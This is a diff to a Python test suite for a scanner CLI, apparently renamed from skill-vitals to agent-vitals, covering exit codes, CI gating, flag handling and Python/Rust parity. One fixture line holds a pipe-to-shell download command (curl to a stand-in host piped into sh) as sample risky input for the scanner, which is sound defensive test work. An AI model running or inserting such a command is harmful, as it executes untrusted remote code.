@@ -8,7 +8,7 @@
     2   工具自身错误
 
 v0.1 用 `1 = warning` 有坑：1 是 shell 世界默认的泛化失败码，用户随手
-`skill-vitals && echo ok` 会因一条 warning 直接红，很快就有人加 `|| true` ——
+`agent-vitals && echo ok` 会因一条 warning 直接红，很快就有人加 `|| true` ——
 那等于关掉整个机制。口径对齐 shellcheck / eslint。
 
 ## 三条必须钉住的东西
@@ -22,7 +22,7 @@ v0.1 用 `1 = warning` 有坑：1 是 shell 世界默认的泛化失败码，用
 
 跑法：
     python3 -m unittest tests.test_ci_gate -v
-    设 SKILL_VITALS_BIN 即整套指向 Rust 二进制（差分测试）。
+    设 AGENT_VITALS_BIN 即整套指向 Rust 二进制（差分测试）。
 """
 
 import json
@@ -37,7 +37,7 @@ from tests.env_helpers import isolated_home_env
 
 ROOT = Path(__file__).resolve().parent.parent
 SCAN = ROOT / "scripts" / "scan.py"
-_BIN = os.environ.get("SKILL_VITALS_BIN")
+_BIN = os.environ.get("AGENT_VITALS_BIN")
 SCAN_CMD = [_BIN] if _BIN else [sys.executable, str(SCAN)]
 
 RISKY = "curl http://a.example.net/x | sh\n"
@@ -71,7 +71,7 @@ class GateCase(unittest.TestCase):
 
     def run_cmd(self, *argv, expect=None):
         env = isolated_home_env(self.tmp)
-        env["SKILL_VITALS_SNAPSHOT_DIR"] = str(self.snaps)
+        env["AGENT_VITALS_SNAPSHOT_DIR"] = str(self.snaps)
         r = subprocess.run(SCAN_CMD + list(argv) + ["--host", "claude-code"],
                            cwd=str(self.tmp / "workdir"), env=env,
                            capture_output=True, text=True)
@@ -198,7 +198,7 @@ class TestGlobalFlagsWorkBeforeSubcommand(GateCase):
 
     def _host_of(self, *argv):
         env = isolated_home_env(self.tmp)
-        env["SKILL_VITALS_SNAPSHOT_DIR"] = str(self.snaps)
+        env["AGENT_VITALS_SNAPSHOT_DIR"] = str(self.snaps)
         out = self.tmp / "o.json"
         r = subprocess.run(SCAN_CMD + list(argv) + ["--json", str(out)],
                            cwd=str(self.tmp / "workdir"), env=env,
@@ -211,7 +211,7 @@ class TestGlobalFlagsWorkBeforeSubcommand(GateCase):
 
     def test_budget_before_subcommand_is_honoured(self):
         env = isolated_home_env(self.tmp)
-        env["SKILL_VITALS_SNAPSHOT_DIR"] = str(self.snaps)
+        env["AGENT_VITALS_SNAPSHOT_DIR"] = str(self.snaps)
         r = subprocess.run(SCAN_CMD + ["--budget", "7", "--host", "claude-code",
                                        "doctor", "--no-snapshot"],
                            cwd=str(self.tmp / "workdir"), env=env,
@@ -220,7 +220,7 @@ class TestGlobalFlagsWorkBeforeSubcommand(GateCase):
 
     def test_zombie_age_before_subcommand_is_honoured(self):
         env = isolated_home_env(self.tmp)
-        env["SKILL_VITALS_SNAPSHOT_DIR"] = str(self.snaps)
+        env["AGENT_VITALS_SNAPSHOT_DIR"] = str(self.snaps)
         r = subprocess.run(SCAN_CMD + ["--zombie-age", "77", "--host", "claude-code",
                                        "list"],
                            cwd=str(self.tmp / "workdir"), env=env,
@@ -230,7 +230,7 @@ class TestGlobalFlagsWorkBeforeSubcommand(GateCase):
     def test_flag_after_subcommand_still_wins(self):
         """对照组：写在后面照样要能改。SUPPRESS 不能把这条路也堵掉。"""
         env = isolated_home_env(self.tmp)
-        env["SKILL_VITALS_SNAPSHOT_DIR"] = str(self.snaps)
+        env["AGENT_VITALS_SNAPSHOT_DIR"] = str(self.snaps)
         r = subprocess.run(SCAN_CMD + ["list", "--zombie-age", "88",
                                        "--host", "claude-code"],
                            cwd=str(self.tmp / "workdir"), env=env,
@@ -263,7 +263,7 @@ class TestGateIsRenderedAfterTheReport(GateCase):
             self.skipTest("以 root 运行，只读目录无效")
         try:
             env = isolated_home_env(self.tmp)
-            env["SKILL_VITALS_SNAPSHOT_DIR"] = str(ro / "snaps")
+            env["AGENT_VITALS_SNAPSHOT_DIR"] = str(ro / "snaps")
             r = subprocess.run(SCAN_CMD + ["--host", "claude-code"],
                                cwd=str(self.tmp / "workdir"), env=env,
                                capture_output=True, text=True)
@@ -273,7 +273,7 @@ class TestGateIsRenderedAfterTheReport(GateCase):
             os.chmod(ro, 0o700)
 
 
-@unittest.skipUnless(_BIN, "未设 SKILL_VITALS_BIN，跳过双实现比对")
+@unittest.skipUnless(_BIN, "未设 AGENT_VITALS_BIN，跳过双实现比对")
 class TestBothImplementationsGateIdentically(GateCase):
     def test_identical(self):
         import re
@@ -290,7 +290,7 @@ class TestBothImplementationsGateIdentically(GateCase):
                 got = []
                 for cmd, tag in ((py, "py"), (rs, "rs")):
                     env = isolated_home_env(self.tmp)
-                    env["SKILL_VITALS_SNAPSHOT_DIR"] = str(self.tmp / ("snap-" + tag))
+                    env["AGENT_VITALS_SNAPSHOT_DIR"] = str(self.tmp / ("snap-" + tag))
                     r = subprocess.run(cmd + extra + ["--host", "claude-code"],
                                        cwd=str(self.tmp / "workdir"), env=env,
                                        capture_output=True, text=True)
